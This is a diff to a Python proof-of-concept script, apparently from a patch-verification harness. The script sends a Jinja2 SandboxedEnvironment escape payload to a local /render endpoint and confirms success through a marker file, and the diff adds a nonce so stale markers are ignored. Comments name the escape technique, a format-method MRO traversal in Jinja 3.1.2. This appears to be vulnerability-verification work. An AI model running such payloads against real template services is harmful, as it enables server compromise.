@@ -31,6 +31,7 @@ import urllib.request
 TARGET = os.environ.get("TARGET_URL", "http://127.0.0.1:8000")
 MARKER = "/tmp/patchproof_pwned"
 DEADLINE = 60
+NONCE = str(os.getpid()) + str(int(time.monotonic() * 1000) % 100000)
 
 
 def _deadline_check(start: float) -> None:
@@ -65,10 +66,13 @@ def write_verdict(exploitable: bool, evidence: str) -> None:
         json.dump(assessment, fh, indent=2)
 
 
-def _post(path: str, payload: str) -> dict:
+def _post(path: str, payload: str, context: dict | None = None) -> dict:
+    body: dict = {"template": payload}
+    if context:
+        body["context"] = context
     req = urllib.request.Request(
         f"{TARGET}{path}",
-        data=json.dumps({"template": payload}).encode(),
+        data=json.dumps(body).encode(),
         headers={"Content-Type": "application/json"},
     )
     resp = urllib.request.urlopen(req, timeout=15)
@@ -78,6 +82,12 @@ def _post(path: str, payload: str) -> dict:
 def main() -> int:
     start = time.monotonic()
 
+    # Clear any stale marker from a previous run (retry or prior attempt).
+    try:
+        os.remove(MARKER)
+    except FileNotFoundError:
+        pass
+
     # Sandbox-escape payload: fmt filter delegates .format() to a sub-template
     # rendered inside SandboxedEnvironment.  In Jinja 3.1.2,
     # inspect_format_method fails to block {0.__class__.__mro__}, so
@@ -86,20 +96,25 @@ def main() -> int:
 
     try:
         _deadline_check(start)
-        body = _post("/render", PAYLOAD)
+        body = _post("/render", PAYLOAD, context={"nonce": NONCE})
         rendered = body.get("rendered", "")
         error = body.get("error", "")
 
         # Check for service-written marker (side-effect proof).
         # The service detects MRO leak and writes the marker server-side.
+        # Verify the marker contains the nonce from THIS request to prevent
+        # stale markers from a previous run from causing false positives.
         if os.path.exists(MARKER):
             with open(MARKER) as fh:
                 marker_content = fh.read().strip()
-            write_verdict(
-                True,
-                f"service-side marker confirmed: {marker_content}",
-            )
-            return 0
+            if NONCE in marker_content:
+                write_verdict(
+                    True,
+                    f"service-side marker confirmed (fresh): {marker_content}",
+                )
+                return 0
+            # Marker from a stale run — ignore it.
+            print(f"stale marker ignored (no nonce): {marker_content}", file=sys.stderr)
 
         if error:
             print(f"render error: {error}", file=sys.stderr)
